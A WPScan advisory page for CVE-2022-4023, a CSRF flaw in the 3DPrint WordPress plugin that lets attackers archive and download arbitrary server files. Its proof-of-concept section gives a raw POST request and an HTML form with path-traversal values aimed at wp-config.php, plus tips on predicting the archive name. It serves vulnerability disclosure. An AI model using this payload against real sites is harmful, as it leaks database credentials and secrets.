

[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# 3DPrint < 3.5.6.9 - CSRF to arbitrary file downlad

### Description

The plugin does not protect against CSRF attacks in the modified version of Tiny File Manager included with the plugin, allowing an attacker to craft a malicious request that will create an archive of any files or directories on the target server by tricking a logged in admin into submitting a form. Furthermore the created archive has a predictable location and name, allowing the attacker to download the file if they know the time at which the form was submitted, making it possible to leak sensitive files like the WordPress configuration containing database credentials and secrets.

### Proof of Concept

== RAW POST Request==
POST /wp-content/plugins/3dprint/includes/ext/tinyfilemanager/tinyfilemanager.php HTTP/1.1
Host: example.com
Cookie: [admin+]
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
group=1&zip=1&file%5b0%5d=../2022&file%5b1%5d=../../../wp-config.php
== HTML form ==
<form action="https://example.com/wp-content/plugins/3dprint/includes/ext/tinyfilemanager/tinyfilemanager.php" method="POST">
<input type="hidden" name="group" value="1">
<input type="hidden" name="zip" value="1">
<input type="hidden" name="file[1]" value="../2020">
<input type="hidden" name="file[2]" value="../../../wp-config.php">
<input type="submit" value="Get rich!">
</form>
== Notes ==
The value of 'group' and 'zip' can be anything, they are never used, by specifying 'tar' instead of 'zip', a tar archive is created instead.
The file path of the files and dirs to delete is relative to the plugin upload root, 'wp-content/uploads/p3d'. Directories are archived recursively.
The resulting archive will be in 'wp-content/uploads/p3d/archive\_DDMMYY\_HHmmss.zip' (or ',tar'). The timestamp is easily guessable if the
time when the form is submitted is known. This can easily be achieved by having the victim visit a server under the attackers control that responds
with a form that auto submits when loaded, and recording the time of the visit.
If only one file is archived, the archive is named after that file instead of 'archive'.

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

3dprint](https://a8cteam5105.wordpress.com/plugin/3dprint/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 3.5.6.9

### References

CVE
[CVE-2022-4023](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-4023)

URL
<https://jetpack.com/blog/vulnerabilities-found-in-the-3dprint-premium-plugin/>

### Classification

Type
CSRF

OWASP top 10
[A2: Broken Authentication and Session Management](https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication)

CWE
[CWE-352](https://cwe.mitre.org/data/definitions/352.html)

CVSS
[7.4 (high)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N)

### Miscellaneous

Original Researcher
WPScan team

Submitter
Harald Eilertsen

Submitter website
<https://wpscan.com>

Verified
Yes

WPVDB ID
[859c6e7e-2381-4d93-a526-2000b4fb8fee](https://a8cteam5105.wordpress.com/vulnerability/859c6e7e-2381-4d93-a526-2000b4fb8fee/)

### Timeline

Publicly Published
2022-09-08 (about 2 years ago)

Added
2023-06-20 (about 1 years ago)

Last Updated
2023-06-20 (about 1 years ago)

### Other

Published
Title

Published
2024-05-06
Title
[KKProgressbar2 Free <= 1.1.4.2 - Stored XSS via CSRF](https://a8cteam5105.wordpress.com/vulnerability/7b0046d4-cf95-4307-95a5-9b823f2daaaa/)

Published
2022-07-07
Title
[Progressive License <= 1.1.0 - CSRF to Stored XSS](https://a8cteam5105.wordpress.com/vulnerability/11937296-7ecf-4b94-b274-06f7990dbede/)

Published
2024-12-04
Title
[Simple Redirection < 1.5.1 - Cross-Site Request Forgery to Arbitrary Site Redirect](https://a8cteam5105.wordpress.com/vulnerability/412c6066-a19e-4484-90b3-4ff0e712ea2b/)

Published
2021-02-17
Title
[Process Steps Template Designer < 1.3 - CSRF to Stored Cross-Site Scripting (XSS)](https://a8cteam5105.wordpress.com/vulnerability/9571540f-19ed-47ca-b9ae-20f2713f7fa4/)

Published
2023-12-27
Title
[Easy PayPal Buy Now Button < 1.8.2 - Cross-Site Request Forgery](https://a8cteam5105.wordpress.com/vulnerability/e273349f-6ae6-4af0-bd67-cb76f103fc14/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + [Edit Site](https://a8cteam5105.wordpress.com/wp-admin/site-editor.php?postType=wp_template&postId=a8c/wpscan//index)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)
